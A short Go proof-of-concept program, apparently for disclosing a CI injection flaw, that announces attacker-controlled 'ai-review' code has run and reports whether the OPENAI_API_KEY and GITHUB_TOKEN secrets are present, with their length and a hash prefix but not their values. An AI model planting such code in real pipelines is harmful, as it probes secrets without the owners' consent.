package main

import (
	"crypto/sha256"
	"fmt"
	"os"
)

func maskedPresence(name string) {
	value := os.Getenv(name)
	if value == "" {
		fmt.Printf("%s_PRESENT=false\n", name)
		return
	}

	sum := sha256.Sum256([]byte(value))
	fmt.Printf("%s_PRESENT=true\n", name)
	fmt.Printf("%s_LENGTH=%d\n", name, len(value))
	fmt.Printf("%s_SHA256_PREFIX=%x\n", name, sum[:6])
}

func main() {
	fmt.Println("POC: attacker-controlled tools/ai-review code executed")
	fmt.Printf("GITHUB_REPOSITORY=%s\n", os.Getenv("GITHUB_REPOSITORY"))
	fmt.Printf("GITHUB_EVENT_NAME=%s\n", os.Getenv("GITHUB_EVENT_NAME"))
	maskedPresence("OPENAI_API_KEY")
	maskedPresence("GITHUB_TOKEN")
}
